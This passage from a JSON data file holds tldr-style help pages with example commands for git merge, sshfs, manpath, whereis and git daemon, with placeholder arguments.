    "git-merge": "# git merge\n> Merge branches. More information: https://git-scm.com/docs/git-merge.\n  * Merge a branch into your current branch:\n`git merge {{branch_name}}`\n  * Edit the merge message:\n`git merge --edit {{branch_name}}`\n  * Merge a branch and create a merge commit:\n`git merge --no-ff {{branch_name}}`\n  * Abort a merge in case of conflicts:\n`git merge --abort`\n  * Merge using a specific strategy:\n`git merge --strategy {{strategy}} --strategy-option {{strategy_option}}\n{{branch_name}}`",
    "sshfs": "# sshfs\n> Filesystem client based on SSH. More information:\n> https://github.com/libfuse/sshfs.\n  * Mount remote directory:\n`sshfs {{username}}@{{remote_host}}:{{remote_directory}} {{mountpoint}}`\n  * Unmount remote directory:\n`umount {{mountpoint}}`\n  * Mount remote directory from server with specific port:\n`sshfs {{username}}@{{remote_host}}:{{remote_directory}} -p {{2222}}`\n  * Use compression:\n`sshfs {{username}}@{{remote_host}}:{{remote_directory}} -C`\n  * Follow symbolic links:\n`sshfs -o follow_symlinks {{username}}@{{remote_host}}:{{remote_directory}}\n{{mountpoint}}`",
    "manpath": "# manpath\n> Determine the search path for manual pages. More information:\n> https://manned.org/manpath.\n  * Display the search path used to find man pages:\n`manpath`\n  * Show the entire global manpath:\n`manpath --global`",
    "whereis": "# whereis\n> Locate the binary, source, and manual page files for a command. More\n> information: https://manned.org/whereis.\n  * Locate binary, source and man pages for ssh:\n`whereis {{ssh}}`\n  * Locate binary and man pages for ls:\n`whereis -bm {{ls}}`\n  * Locate source of gcc and man pages for Git:\n`whereis -s {{gcc}} -m {{git}}`\n  * Locate binaries for gcc in `/usr/bin/` only:\n`whereis -b -B {{/usr/bin/}} -f {{gcc}}`\n  * Locate unusual binaries (those that have more or less than one binary on the system):\n`whereis -u *`\n  * Locate binaries that have unusual manual entries (binaries that have more or less than one manual installed):\n`whereis -u -m *`",
    "git-daemon": "# git daemon\n> A really simple server for Git repositories. More information: https://git-\n> scm.com/docs/git-daemon.\n  * Launch a Git daemon with a whitelisted set of directories:\n`git daemon --export-all {{path/to/directory1}} {{path/to/directory2}}`\n  * Launch a Git daemon with a specific base directory and allow pulling from all sub-directories that look like Git repositories:\n`git daemon --base-path={{path/to/directory}} --export-all --reuseaddr`\n  * Launch a Git daemon for the specified directory, verbosely printing log messages and allowing Git clients to write to it:\n`git daemon {{path/to/directory}} --enable=receive-pack --informative-errors\n--verbose`"
}